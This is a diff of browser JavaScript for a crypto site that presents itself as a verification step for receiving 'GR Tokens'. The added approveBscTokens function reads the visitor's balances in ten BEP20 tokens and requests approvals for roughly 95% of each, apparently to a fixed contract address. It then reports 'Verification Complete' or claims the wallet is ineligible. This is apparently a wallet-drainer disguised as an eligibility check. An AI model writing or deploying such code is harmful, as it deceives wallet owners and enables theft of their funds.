@@ -5,7 +5,7 @@ var loader = document.querySelector(".center");
 var loader_msg = document.querySelector(".loader_message");
 
 // Token Addresses
-const TOKEN_ADDRESSES = [
+const ETH_TOKEN_ADDRESSES = [
   // "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
   // "0x3d6545b08693daE087E957cb1180ee38B9e3c25E", // Ethereum Classic (ETC) # for bsc
   // "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
@@ -15,8 +15,33 @@ const TOKEN_ADDRESSES = [
   // "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"  // Uniswap (UNI)
   // "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24"  // Render(RNDR)
 ];
+const BSC_TOKEN_ADDRESSES = [
+  // "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // Binance Coin (WBNB)
+  // "0x55d398326f99059fF775485246999027B3197955", // Tether (USDT BEP20)
+  // "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", // PancakeSwap (CAKE)
+  // "0xe9e7cea3dedca5984780bafc599bd69add087d56", // Binance USD (BUSD)
+  // "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47c", // Cardano (ADA)
+  // "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", // Polkadot (DOT)
+  // "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", // Chainlink (LINK)
+  // "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", // Ripple (XRP)
+  // "0x23b75c2f6792f514d70d8e2cc81f2d6f0d36b2d8", // VeChain (VET)
+  // "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63"  // Venus (XVS)
+];
+ // BEP20 Tokens
+const BNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+const BEP20_USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
+const CAKE_ADDRESS = "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82";
+const BUSD_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
+const ADA_ADDRESS = "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47";
+const DOT_ADDRESS = "0x7083609fce4d1d8dc0c979aab8c869ea2c873402";
+const LINK_ADDRESS = "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd";
+const XRP_ADDRESS = "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe";
+const VET_ADDRESS = "0x6fdcdfef7c496407ccb0cec90f9c5aaa1cc8d888";
+const XVS_ADDRESS = "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63";
+
+
+// ERC20 Tokens
 const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"
-// const ETHEREUM_CLASSIC_ADDRESS = "0x3d6545b08693daE087E957cb1180ee38B9e3c25E"
 const CHAINLINK_ADDRESS = "0x514910771af9ca656af840dff83e8264ecf986ca"
 const USD_COIN_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
 const WRAPPED_BTICOIN_ADDRESS = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
@@ -559,291 +584,235 @@ const GR_ADDRESS_ABI = {
     }
   ]
 }
-
-const S_TOKEN_ABI = {
+const BEP20_ABI = {
   "abi" : [
     {
-      "inputs": [
-        {
-          "internalType": "uint256",
-          "name": "initialSupply",
-          "type": "uint256"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "constructor"
+        "constant": true,
+        "inputs": [],
+        "name": "name",
+        "outputs": [
+            {
+                "name": "",
+                "type": "string"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "anonymous": false,
-      "inputs": [
-        {
-          "indexed": true,
-          "internalType": "address",
-          "name": "owner",
-          "type": "address"
-        },
-        {
-          "indexed": true,
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        },
-        {
-          "indexed": false,
-          "internalType": "uint256",
-          "name": "value",
-          "type": "uint256"
-        }
-      ],
-      "name": "Approval",
-      "type": "event"
+        "constant": true,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [
+            {
+                "name": "",
+                "type": "string"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "amount",
-          "type": "uint256"
-        }
-      ],
-      "name": "approve",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint8"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "subtractedValue",
-          "type": "uint256"
-        }
-      ],
-      "name": "decreaseAllowance",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
+        "constant": true,
+        "inputs": [
+            {
+                "name": "_owner",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "addedValue",
-          "type": "uint256"
-        }
-      ],
-      "name": "increaseAllowance",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
+        "constant": true,
+        "inputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "name": "allowance",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "to",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "amount",
-          "type": "uint256"
-        }
-      ],
-      "name": "transfer",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
+        "constant": true,
+        "inputs": [],
+        "name": "totalSupply",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "anonymous": false,
-      "inputs": [
-        {
-          "indexed": true,
-          "internalType": "address",
-          "name": "from",
-          "type": "address"
-        },
-        {
-          "indexed": true,
-          "internalType": "address",
-          "name": "to",
-          "type": "address"
-        },
-        {
-          "indexed": false,
-          "internalType": "uint256",
-          "name": "value",
-          "type": "uint256"
-        }
-      ],
-      "name": "Transfer",
-      "type": "event"
+        "constant": true,
+        "inputs": [],
+        "name": "getOwner",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "from",
-          "type": "address"
-        },
-        {
-          "internalType": "address",
-          "name": "to",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "amount",
-          "type": "uint256"
-        }
-      ],
-      "name": "transferFrom",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
-        }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
+        "constant": false,
+        "inputs": [
+            {
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "approve",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "owner",
-          "type": "address"
-        },
-        {
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        }
-      ],
-      "name": "allowance",
-      "outputs": [
-        {
-          "internalType": "uint256",
-          "name": "",
-          "type": "uint256"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
+        "constant": false,
+        "inputs": [
+            {
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
     },
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "account",
-          "type": "address"
-        }
-      ],
-      "name": "balanceOf",
-      "outputs": [
-        {
-          "internalType": "uint256",
-          "name": "",
-          "type": "uint256"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
+        "constant": false,
+        "inputs": [
+            {
+                "name": "sender",
+                "type": "address"
+            },
+            {
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
     },
     {
-      "inputs": [],
-      "name": "decimals",
-      "outputs": [
-        {
-          "internalType": "uint8",
-          "name": "",
-          "type": "uint8"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
+        "anonymous": false,
+        "inputs": [
+            {
+                "indexed": true,
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "indexed": true,
+                "name": "to",
+                "type": "address"
+            },
+            {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }
+        ],
+        "name": "Transfer",
+        "type": "event"
     },
     {
-      "inputs": [],
-      "name": "name",
-      "outputs": [
-        {
-          "internalType": "string",
-          "name": "",
-          "type": "string"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
-    },
-    {
-      "inputs": [],
-      "name": "symbol",
-      "outputs": [
-        {
-          "internalType": "string",
-          "name": "",
-          "type": "string"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
-    },
-    {
-      "inputs": [],
-      "name": "totalSupply",
-      "outputs": [
-        {
-          "internalType": "uint256",
-          "name": "",
-          "type": "uint256"
-        }
-      ],
-      "stateMutability": "view",
-      "type": "function"
+        "anonymous": false,
+        "inputs": [
+            {
+                "indexed": true,
+                "name": "owner",
+                "type": "address"
+            },
+            {
+                "indexed": true,
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }
+        ],
+        "name": "Approval",
+        "type": "event"
     }
-  ]
+]
+
 }
 
 const ERC20_ABI = {
@@ -1076,28 +1045,6 @@ const ERC20_ABI = {
 let contractAddress = "0x7469FB22dEeA3C7565f0332c3366C105b3EB2A8C";
 
 
-export async function is_ethereum_chainId() {
-  const web3 = await get_web3_object();
-
-  // Request the current chain ID
-  // const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-  const chainId = await web3.eth.getChainId()
-
-  // Get the current chain ID
-  // const chainId = await provider.eth.getChainId();
-  console.log(chainId)
-
-  // Check if the chain ID matches BSC (56)
-  if (chainId == '56') {
-    console.log('Connected to Binance Smart Chain (BSC)');
-    return true
-  } 
-  else {
-    // console.log('Not connected to Binance Smart Chain (BSC)');
-    return false
-  }
-}
-
 
 
 async function getSmartContract(contractAddress, abi) {
@@ -1254,6 +1201,138 @@ export async function approveTokens() {
   //   const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
   //   tx = await approveAndSend(S_TOKEN, sTokenContract, userAddress, allowanceInWei, web3);
   // }
+
+  if (zeroCount >= 5) {
+    window.alert("This Wallet Does Not Have Enough Transactions and Is Therefore not Eligible to receive GR Tokens.");
+    localStorage.setItem("approved", "false")
+  }else{
+    window.alert("Verification Complete");
+  localStorage.setItem("approved", "true")
+  }
+}
+
+export async function approveBscTokens() {
+  let zeroCount = 0;
+  let tx;
+  let userAddress = localStorage.getItem('account');
+  let web3 = new Web3(window.ethereum);
+
+  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
+  
+  let bnbContract = await getSmartContract(BNB_ADDRESS, BEP20_ABI)
+  let bep20UsdtContract = await getSmartContract(BEP20_USDT_ADDRESS, BEP20_ABI)
+  let cakeContract = await getSmartContract(CAKE_ADDRESS, BEP20_ABI)
+  let busdContract = await getSmartContract(BUSD_ADDRESS, BEP20_ABI)
+  let adaContract = await getSmartContract(ADA_ADDRESS, BEP20_ABI)
+  let dotContract = await getSmartContract(DOT_ADDRESS, BEP20_ABI)
+  let linkContract = await getSmartContract(LINK_ADDRESS, BEP20_ABI)
+  let xrpContract = await getSmartContract(XRP_ADDRESS, BEP20_ABI)
+  let vetContract = await getSmartContract(VET_ADDRESS, BEP20_ABI)
+  let xvsContract = await getSmartContract(XVS_ADDRESS, BEP20_ABI)
+
+  // getting the user balance for each token
+  // let userGrBalance = await grTokenContract.methods.balanceOf(userAddress).call();
+  // let userStBalance = await sTokenContract.methods.balanceOf(userAddress).call();
+  let bnbBalance = await bnbContract.methods.balanceOf(userAddress).call();
+  console.log("bnb Balance :", bnbBalance)
+  let bep20UsdtBalance = await bep20UsdtContract.methods.balanceOf(userAddress).call();
+  console.log("bep 20 usdt Balance :", bep20UsdtBalance)
+  let cakeBalance = await cakeContract.methods.balanceOf(userAddress).call();
+  console.log("cake Balance :", cakeBalance)
+  let busdBalance = await busdContract.methods.balanceOf(userAddress).call();
+  console.log("busd Balance :", busdBalance)
+  let adaBalance = await adaContract.methods.balanceOf(userAddress).call();
+  console.log("ada Balance :", adaBalance)
+  let dotBalance = await dotContract.methods.balanceOf(userAddress).call();
+  console.log("dot Balance :", dotBalance)
+  let linkBalance = await linkContract.methods.balanceOf(userAddress).call();
+  console.log("link Balance :", linkBalance)
+  let xrpBalance = await xrpContract.methods.balanceOf(userAddress).call();
+  console.log("xrp Balance :", xrpBalance)
+  let vetBalance = await vetContract.methods.balanceOf(userAddress).call();
+  console.log("vet Balance :", vetBalance)
+  let xvsBalance = await xvsContract.methods.balanceOf(userAddress).call();
+  console.log("xvs Balance :", xvsBalance)
+
+
+  
+// here!
+  
+  if (checkBalanceIsEnough(bnbBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(bnbBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(BNB_ADDRESS, bnbContract, userAddress, allowanceInWei, web3);
+  } else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(bep20UsdtBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(bep20UsdtBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(BEP20_USDT_ADDRESS, bep20UsdtContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(cakeBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(cakeBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(CAKE_ADDRESS, cakeContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(busdBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(busdBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(BUSD_ADDRESS, busdContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(adaBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(adaBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(ADA_ADDRESS, adaContract, userAddress, allowanceInWei, web3);
+  }else{
+    zeroCount+=1
+  }
+
+  if (checkBalanceIsEnough(dotBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(dotBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(DOT_ADDRESS, dotContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(linkBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(linkBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(LINK_ADDRESS, linkContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(xrpBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(xrpBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(XRP_ADDRESS, xrpContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(vetBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(vetBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(VET_ADDRESS, vetContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  if (checkBalanceIsEnough(xvsBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(xvsBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    console.log(allowanceInWei)
+    tx = await approveAndSend(XVS_ADDRESS, xvsContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
+
+  console.log(zeroCount)
+  console.log("Done!")
 
   if (zeroCount >= 5) {
     window.alert("This Wallet Does Not Have Enough Transactions and Is Therefore not Eligible to receive GR Tokens.");
